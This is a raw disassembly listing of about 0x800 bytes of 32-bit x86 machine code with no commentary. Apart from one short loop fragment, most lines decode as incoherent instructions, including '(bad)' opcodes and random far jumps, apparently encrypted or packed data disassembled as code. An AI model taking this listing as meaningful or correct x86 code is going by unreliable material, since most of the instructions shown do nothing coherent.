  4204ff:	scas   eax,DWORD PTR es:[edi]
  420500:	xor    BYTE PTR [eax],dl
  420502:	lahf   
  420503:	jnp    0x42052f
  420505:	jecxz  0x420568
  420507:	cmp    ah,BYTE PTR [ecx]
  420509:	repz test eax,0x557d34b2
  42050f:	jno    0x420558
  420511:	push   ecx
  420512:	fistp  QWORD PTR [edi+0x3f621708]
  420518:	and    edi,DWORD PTR [edx]
  42051a:	cmovnp esp,ecx
  42051d:	pop    eax
  42051e:	aad    0x86
  420520:	inc    ebx
  420521:	dec    esp
  420522:	ret    0x2624
  420525:	aaa    
  420526:	outs   dx,BYTE PTR ds:[esi]
  420527:	(bad)  
  420528:	out    0x47,eax
  42052a:	jmp    0x4204d3
  42052c:	push   ebx
  42052d:	fisttp WORD PTR [ebx]
  42052f:	es sti 
  420531:	xlat   BYTE PTR ds:[ebx]
  420532:	and    al,0x43
  420534:	push   edi
  420535:	pop    ss
  420536:	cmp    BYTE PTR [edx],dl
  420538:	pop    ebx
  420539:	in     al,dx
  42053a:	ja     0x4205b9
  42053c:	repnz cmp BYTE PTR ss:0x78ee335,dh
  420544:	icebp  
  420545:	scas   eax,DWORD PTR es:[edi]
  420546:	and    al,0x99
  420548:	pop    esi
  420549:	jbe    0x42052b
  42054b:	rcl    DWORD PTR [ebx+ebx*1-0x31d754ca],cl
  420552:	mov    ch,0x16
  420554:	leave  
  420555:	pop    eax
  420556:	in     eax,0xe2
  420558:	push   0x7fd6f71b
  42055d:	push   ds
  42055e:	and    DWORD PTR [ecx-0xe1876fa],0xffffff8f
  420565:	xchg   edi,eax
  420566:	mov    ds:0x7d096ca4,al
  42056b:	test   eax,0x651f143d
  420570:	adc    BYTE PTR [ebp-0x232f9ed1],0xf7
  420577:	pop    eax
  420578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420579:	call   0x74852fad
  42057e:	and    ebx,DWORD PTR [esi]
  420580:	inc    eax
  420581:	fisubr WORD PTR ss:[eax-0x40bad924]
  420588:	pop    ds
  420589:	pop    ecx
  42058a:	xchg   ebx,eax
  42058b:	punpcklbw mm5,mm1
  42058e:	dec    DWORD PTR [edx-0x57]
  420591:	inc    edi
  420592:	cli    
  420593:	outs   dx,BYTE PTR ds:[esi]
  420594:	sub    BYTE PTR [edx-0xa],ch
  420597:	es mov cl,0xcd
  42059a:	jge    0x42055b
  42059c:	sub    BYTE PTR ds:0x91b3b18f,dl
  4205a2:	fimul  WORD PTR [ebx+ecx*4-0x415b5f5e]
  4205a9:	(bad)  
  4205aa:	dec    ebp
  4205ab:	int3   
  4205ac:	dec    ax
  4205ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205af:	jge    0x420575
  4205b1:	push   ebx
  4205b2:	dec    ebx
  4205b3:	rcr    BYTE PTR [edx+0x2dfe18a9],0xf8
  4205ba:	push   ds
  4205bb:	push   0xb
  4205bd:	add    BYTE PTR [esi],dl
  4205bf:	add    eax,0x76f1ddab
  4205c4:	xchg   ebp,eax
  4205c5:	aam    0x8e
  4205c7:	retf   
  4205c8:	inc    ebx
  4205c9:	into   
  4205ca:	out    dx,al
  4205cb:	out    0xa4,eax
  4205cd:	hlt    
  4205ce:	in     eax,0x85
  4205d0:	or     dl,bl
  4205d2:	cmp    eax,0xf527fea4
  4205d7:	sub    al,0xb6
  4205d9:	fld    QWORD PTR [edi+edx*8+0x69730f5b]
  4205e0:	ficom  DWORD PTR [ecx*4-0x26118be8]
  4205e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e8:	loopne 0x420639
  4205ea:	push   cs
  4205eb:	and    DWORD PTR [ecx],esp
  4205ed:	cdq    
  4205ee:	sub    dl,al
  4205f0:	ror    BYTE PTR [ecx+edx*4],1
  4205f3:	loopne 0x420576
  4205f5:	into   
  4205f6:	or     eax,0x7848304d
  4205fb:	jmp    0xe117:0xb714a2c4
  420602:	stc    
  420603:	cmp    BYTE PTR [edi+0x1e],0x6c
  420607:	daa    
  420608:	cmp    al,0x1c
  42060a:	dec    edi
  42060b:	(bad)  [eax-0x41]
  42060e:	gs aad 0x63
  420611:	call   0x7b46:0x4fccb4a
  420618:	and    eax,0xa82aaa25
  42061d:	into   
  42061e:	(bad)  
  42061f:	xlat   BYTE PTR ds:[ebx]
  420620:	jae    0x420674
  420622:	div    BYTE PTR [ebp+0x15]
  420625:	stos   DWORD PTR es:[edi],eax
  420626:	mov    es,eax
  420628:	ror    DWORD PTR [edi+0x7d48131f],0x62
  42062f:	mov    esp,DWORD PTR [eax]
  420631:	out    dx,eax
  420632:	arpl   WORD PTR [edx],bp
  420634:	(bad)  
  420635:	mov    BYTE PTR [eax+0x3c4be8ee],ah
  42063b:	adc    DWORD PTR [ebp+0x32b58373],eax
  420641:	lds    esp,FWORD PTR [edx-0x22]
  420644:	jp     0x4205fb
  420646:	push   ds
  420647:	adc    BYTE PTR [esi-0x7f],ah
  42064a:	lods   al,BYTE PTR ds:[esi]
  42064b:	pop    ss
  42064c:	xchg   edx,eax
  42064d:	sbb    BYTE PTR [esi+0x7f9bec5d],dl
  420653:	pop    eax
  420654:	scas   eax,DWORD PTR es:[edi]
  420655:	sub    DWORD PTR [eax],ebp
  420657:	test   al,0x58
  420659:	inc    edi
  42065a:	jle    0x420613
  42065c:	in     eax,dx
  42065d:	jmp    0xd48f6d4b
  420662:	test   esi,eax
  420664:	pop    edx
  420665:	out    0x38,al
  420667:	mov    dh,dl
  420669:	(bad)  
  42066a:	ja     0x420629
  42066c:	dec    eax
  42066d:	cmp    DWORD PTR [edx+0x3f17af5d],0x5aefad80
  420677:	mov    eax,ds:0x819e8a1e
  42067c:	and    esi,ecx
  42067e:	bound  ebx,QWORD PTR [edx-0x2d]
  420681:	mov    dl,0x5c
  420683:	stos   BYTE PTR es:[edi],al
  420684:	jmp    0xde4ff1cd
  420689:	and    eax,0xb83399c4
  42068e:	cdq    
  42068f:	mov    ds:0x9ce3fcb2,eax
  420694:	mov    ebx,0xbc864420
  420699:	cld    
  42069a:	push   ss
  42069b:	mov    ah,0x92
  42069d:	loopne 0x4206c9
  42069f:	cmp    DWORD PTR [edx-0x4e],ecx
  4206a2:	lahf   
  4206a3:	retf   0xffb2
  4206a6:	dec    esp
  4206a7:	div    BYTE PTR [esi+eiz*8+0x24981e8b]
  4206ae:	xlat   BYTE PTR ds:[ebx]
  4206af:	fldcw  WORD PTR [ebp+0x58]
  4206b2:	fisub  WORD PTR [edi+ebx*4]
  4206b5:	inc    ebp
  4206b6:	adc    edi,DWORD PTR [ebx+ecx*2-0x3a]
  4206ba:	repnz inc ecx
  4206bc:	fwait
  4206bd:	jno    0x4206ce
  4206bf:	outs   dx,BYTE PTR ds:[esi]
  4206c0:	(bad)  
  4206c3:	ja     0x42067f
  4206c5:	in     eax,0xe6
  4206c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c8:	push   es
  4206c9:	mov    al,0xa3
  4206cb:	add    ecx,DWORD PTR [esi-0x22]
  4206ce:	(bad)  
  4206d0:	add    bl,ch
  4206d2:	jl     0x4206d4
  4206d4:	xchg   al,dh
  4206d6:	adc    BYTE PTR [esi-0x68],0x6
  4206da:	and    DWORD PTR [edx+0x35],edx
  4206dd:	mov    esi,DWORD PTR [ebx-0x2f]
  4206e0:	shl    BYTE PTR [ebp-0x1f85b578],0x7b
  4206e7:	rcr    BYTE PTR ds:0xa61ff522,0x86
  4206ee:	adc    ebp,edx
  4206f0:	sahf   
  4206f1:	sub    bl,bl
  4206f3:	xchg   esp,eax
  4206f4:	(bad)  
  4206f5:	hlt    
  4206f6:	int3   
  4206f7:	mov    ebp,0xdff17da1
  4206fc:	pop    ss
  4206fd:	cmp    esi,ecx
  4206ff:	inc    ebp
  420700:	push   ss
  420701:	or     eax,0x7936c6b1
  420706:	lods   eax,DWORD PTR ds:[esi]
  420707:	mov    DWORD PTR [ebx+0x17],eax
  42070a:	in     al,0x43
  42070c:	inc    esi
  42070d:	fadd   DWORD PTR [edx+0x60]
  420710:	adc    eax,0x73333522
  420715:	mov    dl,0xca
  420717:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  420719:	jne    0x4206bf
  42071b:	inc    ebp
  42071c:	retf   0x43e2
  42071f:	not    BYTE PTR [edi]
  420721:	aas    
  420722:	add    DWORD PTR [ebp+0x68bd10f0],ebp
  420728:	ds mov ah,ah
  42072b:	mov    ebp,0x1b75ef43
  420730:	fcomp  QWORD PTR [ecx+0x75]
  420733:	pop    es
  420734:	cwde   
  420735:	jmp    0x5cf4985b
  42073a:	ret    
  42073b:	pushf  
  42073c:	retf   
  42073d:	push   eax
  42073e:	push   eax
  42073f:	cwde   
  420740:	ds adc al,0xf4
  420743:	loope  0x4207ab
  420745:	sbb    eax,0x68f22a96
  42074a:	pop    ds
  42074b:	xchg   edi,eax
  42074c:	sub    al,0x81
  42074e:	repnz fisubr DWORD PTR [ebp+0x0]
  420752:	add    BYTE PTR [ebx-0x1074b],cl
  420758:	jmp    DWORD PTR [ebx]
  42075a:	(bad)  
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a8:	ss ret 
  4207aa:	iret   
  4207ab:	jl     0x420750
  4207ad:	sar    BYTE PTR [esi-0x41413bb6],0xad
  4207b4:	cdq    
  4207b5:	into   
  4207b6:	ret    
  4207b7:	mov    eax,0xe28d873
  4207bc:	push   edx
  4207bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207be:	mov    bh,0xc9
  4207c0:	add    DWORD PTR [eax+0x1c],ebp
  4207c3:	sbb    al,0x4a
  4207c5:	sbb    eax,DWORD PTR [ebp-0x6995107a]
  4207cb:	sbb    BYTE PTR [ecx],bh
  4207cd:	addr16 into 
  4207cf:	or     al,0x2a
  4207d1:	mov    ch,BYTE PTR [ebx+0x74]
  4207d4:	(bad)  [ebp+0x70]
  4207d7:	xchg   bl,ah
  4207d9:	pop    es
  4207da:	dec    esp
  4207db:	cmc    
  4207dc:	xchg   eax,edx
  4207de:	js     0x420806
  4207e0:	xor    dl,BYTE PTR [eax]
  4207e2:	mov    esi,0x9906d5d7
  4207e7:	mov    ah,0xe5
  4207e9:	mov    eax,0xf2b63392
  4207ee:	mov    ah,0x76
  4207f0:	sahf   
  4207f1:	push   0x803e839e
  4207f6:	add    al,bh
  4207f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207f9:	les    edx,FWORD PTR [esi-0x1d]
  4207fc:	data16 (bad) [eax]
  4207ff:	inc    esp
  420800:	mov    ebp,0x3bd4f6ca
  420805:	mov    al,0xe9
  420807:	xchg   ebx,eax
  420808:	into   
  420809:	iret   
  42080a:	jnp    0x4207a6
  42080c:	dec    edx
  42080d:	lea    ebp,[edx]
  42080f:	iret   
  420810:	retf   
  420811:	(bad)  
  420812:	sbb    ebp,DWORD PTR [eax+0x36cc5cbb]
  420818:	mov    ebx,0x2fbbda79
  42081d:	xchg   ebx,esi
  42081f:	mov    edi,0xbd9cdedb
  420824:	push   ebx
  420825:	push   ecx
  420826:	sub    bh,bh
  420828:	int3   
  420829:	jecxz  0x42087f
  42082b:	jl     0x420830
  42082d:	(bad)  
  42082e:	mov    ds:0xe81b9f8,al
  420833:	in     al,0x58
  420835:	leave  
  420836:	(bad)  
  420837:	cli    
  420838:	cmp    al,BYTE PTR [edi-0x1d629514]
  42083e:	neg    BYTE PTR es:[esi+0x52]
  420842:	sub    eax,0x1051dd27
  420847:	popa   
  420848:	push   es
  420849:	outs   dx,DWORD PTR ds:[esi]
  42084a:	inc    edx
  42084b:	mov    edi,0x584f4893
  420850:	retf   0xae40
  420853:	sbb    ebp,DWORD PTR [ebx-0x2902da5b]
  420859:	das    
  42085a:	jmp    FWORD PTR [edi]
  42085c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42085d:	sar    ebx,0x5b
  420860:	xchg   eax,ebx
  420862:	sar    DWORD PTR [eax],1
  420864:	fnstsw WORD PTR [ebp-0x27]
  420867:	lock sub eax,ebx
  42086a:	inc    ecx
  42086b:	pop    ds
  42086c:	mov    al,0xf5
  42086e:	jno    0x4208c0
  420870:	lea    eax,[edi+eax*1+0x3f8aca4c]
  420877:	add    al,0xfc
  420879:	sbb    DWORD PTR [esi],0x5a4da494
  42087f:	cmp    BYTE PTR [esi+0x322d3125],bl
  420885:	push   esp
  420886:	sbb    dh,BYTE PTR [esi+0x5b]
  420889:	retf   
  42088a:	push   ebp
  42088b:	pop    esp
  42088c:	hlt    
  42088d:	rcr    DWORD PTR [esi-0x1d94dc70],0xa8
  420894:	or     eax,0xca86804
  420899:	add    dl,bh
  42089b:	jnp    0x420897
  42089d:	and    eax,edi
  42089f:	jge    0x4208d7
  4208a1:	sbb    DWORD PTR [ebx],edx
  4208a3:	pushf  
  4208a4:	pop    ebp
  4208a5:	sub    BYTE PTR [ecx+eax*1],dh
  4208a8:	cmp    esi,ebp
  4208aa:	jp     0x4208bc
  4208ac:	rol    BYTE PTR [edx+eax*2+0x55],0xcb
  4208b1:	push   eax
  4208b2:	push   es
  4208b3:	xchg   DWORD PTR [eax],edi
  4208b5:	inc    eax
  4208b6:	popf   
  4208b7:	push   es
  4208b8:	mov    cs,WORD PTR [esi-0x1b11515e]
  4208be:	push   cs
  4208bf:	gs xchg esp,eax
  4208c1:	and    ch,bh
  4208c3:	out    0x9d,al
  4208c5:	ss (bad) 
  4208c8:	hlt    
  4208c9:	lds    edi,FWORD PTR [eax-0x65]
  4208cc:	mov    dh,0xb8
  4208ce:	cmp    DWORD PTR [edi+0x79],esi
  4208d1:	pop    ecx
  4208d2:	xchg   DWORD PTR [edx+0x62],ecx
  4208d5:	stc    
  4208d6:	std    
  4208d7:	ror    DWORD PTR [eax-0xf],cl
  4208da:	loopne 0x4208e6
  4208dc:	mov    DWORD PTR [ecx],eax
  4208de:	inc    edi
  4208df:	mov    eax,ds:0x4a571aa3
  4208e4:	push   edx
  4208e5:	mov    al,0x8c
  4208e7:	mov    eax,0x91312905
  4208ec:	sbb    al,0xed
  4208ee:	push   0xe7ea6d35
  4208f3:	xor    al,0x1f
  4208f5:	mov    dh,0x70
  4208f7:	aam    0xce
  4208f9:	ret    
  4208fa:	mov    cs,WORD PTR [ebp-0x3aa0ff4f]
  420900:	pop    edx
  420901:	pop    ss
  420902:	mov    cl,0x15
  420904:	nop
  420905:	and    BYTE PTR [esi+eiz*4+0x3e12d90d],cl
  42090c:	xor    DWORD PTR [edi],eax
  42090e:	daa    
  42090f:	mov    eax,ds:0x8a3c4e37
  420914:	mov    esi,0x3629834f
  420919:	ret    0xa704
  42091c:	pop    edx
  42091d:	pop    ds
  42091e:	dec    ebp
  42091f:	scas   eax,DWORD PTR es:[edi]
  420920:	repnz adc ah,BYTE PTR ss:[eax-0x5f32c6dd]
  420928:	push   esp
  420929:	test   DWORD PTR [ecx],0x4023ac50
  42092f:	stc    
  420930:	or     eax,0xaa7931b4
  420935:	dec    edi
  420936:	das    
  420937:	xchg   ebp,eax
  420938:	addr16 xor al,0x20
  42093c:	sbb    eax,DWORD PTR [esi-0x7acc0628]
  420942:	pop    ebp
  420943:	xor    ebp,edi
  420945:	sub    al,0xa7
  420947:	stos   DWORD PTR es:[edi],eax
  420948:	outs   dx,DWORD PTR ds:[esi]
  420949:	mov    eax,0x311f6cc2
  42094e:	push   es
  42094f:	mov    BYTE PTR [esi],ah
  420951:	add    bl,BYTE PTR ds:0xefcc18ab
  420957:	and    eax,0xfadba51a
  42095c:	retf   0xa2e9
  42095f:	xchg   ebp,eax
  420960:	pop    edi
  420961:	dec    edx
  420962:	dec    eax
  420963:	retf   
  420964:	inc    ecx
  420965:	or     al,0x22
  420967:	pop    edx
  420968:	mov    al,ds:0xdf8122c6
  42096d:	sbb    eax,0xd3a94c8
  420972:	std    
  420973:	xchg   edx,eax
  420974:	rcr    bh,cl
  420976:	and    eax,0xe18a1722
  42097b:	push   es
  42097c:	sub    ebp,DWORD PTR [edx+0x6e]
  42097f:	jnp    0x4209d2
  420981:	push   esp
  420982:	jae    0x420998
  420984:	or     DWORD PTR [ecx-0x4a57aa9],esi
  42098a:	test   al,0x93
  42098c:	pop    ds
  42098d:	int    0xc8
  42098f:	push   ss
  420990:	and    eax,0x47f808cb
  420995:	mov    dl,0x4b
  420997:	fwait
  420998:	mov    gs,WORD PTR [ecx+0x64]
  42099b:	mov    ah,dh
  42099d:	jg     0x4209ef
  42099f:	dec    eax
  4209a0:	dec    edi
  4209a1:	cli    
  4209a2:	adc    dl,ch
  4209a4:	imul   ebx,DWORD PTR [ebx],0x9d3dada4
  4209aa:	dec    ebp
  4209ab:	shl    edi,0xda
  4209ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209af:	mov    ebp,0xd35a1de8
  4209b4:	mov    ds:0x762311dc,al
  4209b9:	jmp    0xf4d19a63
  4209be:	xchg   ebx,eax
  4209bf:	cwde   
  4209c0:	cmp    eax,0xba7cd6a7
  4209c5:	test   BYTE PTR [ecx+0x41],cl
  4209c8:	sbb    ch,dh
  4209ca:	push   ebp
  4209cb:	push   ss
  4209cc:	or     al,0x74
  4209ce:	adc    bh,BYTE PTR [edx+ecx*1]
  4209d1:	cmp    bh,bl
  4209d3:	pushf  
  4209d4:	(bad)  
  4209d5:	mov    ebp,0xd0aa7829
  4209da:	pop    esi
  4209db:	call   0xe78a69e8
  4209e0:	les    esp,FWORD PTR ds:0x6ad16af6
  4209e6:	icebp  
  4209e7:	mov    DWORD PTR [ebx-0x25],eax
  4209ea:	xchg   ebp,eax
  4209eb:	mov    esi,0xe2523ad1
  4209f0:	out    0xdc,al
  4209f2:	cmp    eax,0xb10a2837
  4209f7:	dec    esp
  4209f8:	test   dl,dl
  4209fa:	pusha  
  4209fb:	jnp    0x4209ed
  4209fd:	xor    edx,DWORD PTR es:[ebp+0x28b18446]
  420a04:	outs   dx,BYTE PTR ds:[esi]
  420a05:	aad    0x2
  420a07:	(bad)
  420a0c:	push   0x65
  420a0e:	pop    ebx
  420a0f:	push   0xffffffce
  420a11:	sbb    BYTE PTR [esi],ah
  420a13:	neg    ecx
  420a15:	and    esi,DWORD PTR [ecx+0x77027778]
  420a1b:	nop
  420a1c:	xor    edx,ecx
  420a1e:	in     al,0xa4
  420a20:	dec    eax
  420a21:	into   
  420a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a23:	retf   0x5832
  420a26:	ret    0x63fd
  420a29:	sub    BYTE PTR [esi+0x75941fa4],0xaf
  420a30:	mov    eax,ds:0x98df7cd4
  420a35:	pushf  
  420a36:	mov    dh,0xe7
  420a38:	outs   dx,DWORD PTR ds:[esi]
  420a39:	or     esp,DWORD PTR [edx-0x1b]
  420a3c:	inc    edi
  420a3d:	mov    esi,0xc8dc3149
  420a42:	pop    edi
  420a43:	and    DWORD PTR [eax],esi
  420a45:	or     ch,BYTE PTR [edx]
  420a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a48:	ror    DWORD PTR [edi],cl
  420a4a:	pop    eax
  420a4b:	sub    eax,0xd174af0a
  420a50:	leave  
  420a51:	test   BYTE PTR ds:0x90aa4384,bl
  420a57:	(bad)  
  420a58:	jge    0x420a8a
  420a5a:	mov    ebx,eax
  420a5c:	imul   ecx,ebx,0xaceb65f3
  420a62:	xchg   edx,eax
  420a63:	stos   BYTE PTR es:[edi],al
  420a64:	jbe    0x420a60
  420a66:	enter  0x40ba,0xff
  420a6a:	jp     0x420a08
  420a6c:	in     eax,0x66
  420a6e:	mov    edi,DWORD PTR [ecx-0x52]
  420a71:	repz dec esp
  420a73:	push   DWORD PTR [esi+0x67]
  420a76:	mov    al,ds:0x5408046c
  420a7b:	pop    esp
  420a7c:	mov    edx,0xe882b1ec
  420a81:	mov    bh,0x87
  420a83:	mov    ah,0xd
  420a85:	dec    esi
  420a86:	mov    ah,BYTE PTR ds:0x874753b1
  420a8c:	add    cl,BYTE PTR [ecx]
  420a8e:	cmp    esi,DWORD PTR [ecx-0x6c]
  420a91:	out    0x60,al
  420a93:	nop
  420a94:	push   edx
  420a95:	inc    esp
  420a96:	pop    eax
  420a97:	out    0xd,eax
  420a99:	fdiv   DWORD PTR [esi+eiz*2+0x2f]
  420a9d:	inc    ebx
  420a9e:	data16 imul dh
  420aa1:	cmp    ecx,ecx
  420aa3:	mov    dh,0x8b
  420aa5:	xchg   esp,eax
  420aa6:	in     eax,0xe6
  420aa8:	cld    
  420aa9:	cmp    eax,0x501ee715
  420aae:	add    DWORD PTR [ebp+0x8878498],0xffffffe0
  420ab5:	push   ebx
  420ab6:	or     eax,DWORD PTR ds:[esi-0x6a]
  420aba:	xchg   edi,eax
  420abb:	test   DWORD PTR ds:0xfd385148,esi
  420ac1:	or     DWORD PTR [ebx-0x3],0x14
  420ac5:	add    dh,BYTE PTR [eax+0x2b]
  420ac8:	pop    ss
  420ac9:	aaa    
  420aca:	outs   dx,BYTE PTR ds:[esi]
  420acb:	lahf   
  420acc:	xchg   edi,eax
  420acd:	xchg   edx,eax
  420ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420acf:	jmp    0x55b8:0xf2072a05
  420ad6:	sub    BYTE PTR [eax+0x74],dl
  420ad9:	cwde   
  420ada:	inc    eax
  420adb:	sub    al,0x83
  420add:	add    ebp,DWORD PTR [eax-0x6b67b926]
  420ae3:	arpl   WORD PTR [edi],si
  420ae5:	int3   
  420ae6:	jp     0x420a97
  420ae8:	pop    ecx
  420ae9:	and    BYTE PTR [edi-0xe],cl
  420aec:	push   edi
  420aed:	std    
  420aee:	cmp    dl,BYTE PTR [esp+esi*1+0x1cfe73ba]
  420af5:	jo     0x420aa3
  420af7:	std    
  420af8:	jge    0x420b68
  420afa:	test   BYTE PTR [ecx+0x57],bl
  420afd:	jns    0x420b06
  420aff:	mov    bh,0x5e
  420b01:	mov    ebx,edx
  420b03:	mov    cl,0x1f
  420b05:	sbb    al,0xcc
  420b07:	icebp  
  420b08:	jns    0x420ac4
  420b0a:	sub    dh,cl
  420b0c:	aas    
  420b0d:	xchg   bl,dl
  420b0f:	iret   
  420b10:	inc    ebx
  420b11:	mov    eax,ds:0x2f348ff5
  420b16:	rcr    BYTE PTR [eax+0x4d],0xdf
  420b1a:	xchg   edx,eax
  420b1b:	fnsave ds:0x755bf034
  420b21:	mov    eax,ds:0xd9268e42
  420b26:	leave  
  420b27:	jmp    0xa8d0e280
  420b2c:	dec    ecx
  420b2d:	sbb    eax,0xffcd8d31
  420b32:	mov    ch,0xc3
  420b34:	xchg   ecx,eax
  420b35:	in     al,dx
  420b36:	push   esi
  420b37:	mov    bl,0x3e
  420b39:	pop    ebx
  420b3a:	outs   dx,DWORD PTR ds:[esi]
  420b3b:	dec    ebp
  420b3c:	dec    ecx
  420b3d:	jp     0x420b78
  420b3f:	clc    
  420b40:	jl     0x420ae9
  420b42:	dec    ebx
  420b43:	add    BYTE PTR [edi],0x94
  420b46:	jbe    0x420b64
  420b48:	in     eax,dx
  420b49:	sbb    DWORD PTR [eax+0x43],edi
  420b4c:	sbb    eax,0x9762c4a6
  420b51:	jge    0x420b8f
  420b53:	(bad)  
  420b54:	leave  
  420b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b56:	mov    ecx,0x42b27fa2
  420b5b:	push   cs
  420b5c:	inc    esi
  420b5d:	and    eax,DWORD PTR [edx]
  420b5f:	popa   
  420b60:	inc    ecx
  420b61:	and    eax,0x572e7e99
  420b66:	lahf   
  420b67:	sub    bl,BYTE PTR [ecx]
  420b69:	xlat   BYTE PTR ds:[ebx]
  420b6a:	xor    eax,0xb5a686ac
  420b6f:	pop    edx
  420b70:	inc    ecx
  420b71:	sub    BYTE PTR [ebx-0x6],0xfe
  420b75:	stc    
  420b76:	(bad)  
  420b77:	retf   
  420b78:	pop    ebx
  420b79:	xor    esi,DWORD PTR [edx]
  420b7b:	pop    ebx
  420b7c:	mov    al,ds:0xff18858b
  420b81:	(bad)  
  420b82:	dec    DWORD PTR [ebx-0x14373]
  420b88:	(bad)  
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [ebx+esi*1+0x8dd70c7],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0x3d
  420ba7:	sar    DWORD PTR [ebp-0x76],cl
  420baa:	imul   edx,ebx,0xffffffd5
  420bad:	jnp    0x420bd5
  420baf:	(bad)  
  420bb0:	and    BYTE PTR [eax-0x71],al
  420bb3:	mov    esi,0x7ee8fd60
  420bb8:	daa    
  420bb9:	cmp    BYTE PTR [ebp+0x6ca72c22],dl
  420bbf:	popf   
  420bc0:	sub    al,0x45
  420bc2:	mov    cs,WORD PTR ds:0x3d62cf0f
  420bc8:	add    eax,0x84165a39
  420bcd:	sbb    eax,0x6933ec4b
  420bd2:	cmp    DWORD PTR [eax],esp
  420bd4:	mov    ds,WORD PTR [ebp-0x11]
  420bd7:	mov    al,BYTE PTR [edi]
  420bd9:	sahf   
  420bda:	inc    edi
  420bdb:	lods   eax,DWORD PTR ds:[esi]
  420bdc:	dec    ebx
  420bdd:	lds    ebp,FWORD PTR [ebx-0x20]
  420be0:	cmp    DWORD PTR [esi],0x2e
  420be3:	je     0x420ba7
  420be5:	mov    eax,ds:0x9b372fa9
  420bea:	call   0xcb4e:0xbcc2b5a7
  420bf1:	aaa    
  420bf2:	out    0x60,eax
  420bf4:	mov    bh,0xaf
  420bf6:	inc    ebx
  420bf7:	push   eax
  420bf8:	or     ebx,DWORD PTR [eax]
  420bfa:	outs   dx,BYTE PTR ds:[esi]
  420bfb:	add    eax,0xee7f014b
  420c00:	push   esp
  420c01:	sbb    eax,0x825fae80
  420c06:	add    esp,DWORD PTR [edx-0x1]
  420c09:	xor    eax,0x2bfd5f23
  420c0e:	push   ds
  420c0f:	push   ecx
  420c10:	aaa    
  420c11:	dec    edx
  420c12:	popf   
  420c13:	cwde   
  420c14:	out    0x9f,eax
  420c16:	mov    edx,0x1960e97a
  420c1b:	(bad)  
  420c1c:	(bad)
  420c1f:	add    dl,BYTE PTR [ebx]
  420c21:	je     0x420bc4
  420c23:	ror    edx,0xaf
  420c26:	mov    dh,0x3a
  420c28:	scas   eax,DWORD PTR es:[edi]
  420c29:	inc    edi
  420c2a:	or     DWORD PTR [edi+ebp*2],eax
  420c2d:	cmp    DWORD PTR [esi-0x26],0xa798f907
  420c34:	int3   
  420c35:	jge    0x420cb5
  420c37:	jbe    0x420cb4
  420c39:	jno    0x420bdc
  420c3b:	and    eax,0xcb29696e
  420c40:	bswap  ebp
  420c42:	pop    ds
  420c43:	jp     0x420bd2
  420c45:	lahf   
  420c46:	ror    DWORD PTR [edi-0xd],cl
  420c49:	pop    esp
  420c4a:	xor    dh,BYTE PTR [esi-0x9]
  420c4d:	arpl   WORD PTR [ecx],di
  420c4f:	push   cs
  420c50:	xchg   ecx,eax
  420c51:	mov    ebx,ecx
  420c53:	dec    esi
  420c54:	(bad)  
  420c55:	xchg   esp,eax
  420c56:	cmp    al,BYTE PTR ds:0x2430d149
  420c5c:	adc    esi,DWORD PTR [ebx]
  420c5e:	sar    BYTE PTR [ecx-0x51f01c0a],0xcf
  420c65:	add    dl,dl
  420c67:	ja     0x420c3f
  420c69:	imul   edi,DWORD PTR [eax-0x6df1fb38],0x33
  420c70:	outs   dx,DWORD PTR ds:[esi]
  420c71:	pop    eax
  420c72:	rcl    dh,1
  420c74:	mov    dh,ch
  420c76:	lods   eax,DWORD PTR ds:[esi]
  420c77:	loop   0x420cdf
  420c79:	sub    BYTE PTR [ebp+0x7aa058c],ch
  420c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c80:	fcomi  st,st(3)
  420c82:	jns    0x420c5b
  420c84:	jmp    0xa466:0x34c7f6e5
  420c8b:	or     esi,DWORD PTR [ebx-0x1330aa2a]
  420c91:	mov    eax,0xb86e0e23
  420c96:	test   ebx,edi
  420c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c99:	shr    DWORD PTR ds:[edi],0xd5
  420c9d:	(bad)  
  420c9f:	jo     0x420cae
  420ca1:	dec    eax
  420ca2:	push   esp
  420ca3:	repnz ss mov al,0x20
  420ca7:	(bad)  
  420ca8:	or     DWORD PTR [ecx+0x34],0xffffffd7
  420cac:	rcr    BYTE PTR [esi-0x59],1
  420caf:	stos   DWORD PTR es:[edi],eax
  420cb0:	or     eax,0xfc40e75a
  420cb5:	jmp    0x14d0aefa
  420cba:	jle    0x420cc6
  420cbc:	or     eax,0xd4c8fe1f
  420cc1:	and    BYTE PTR ss:[ebp-0x6680ed9d],dh
  420cc8:	mov    ah,0xe4
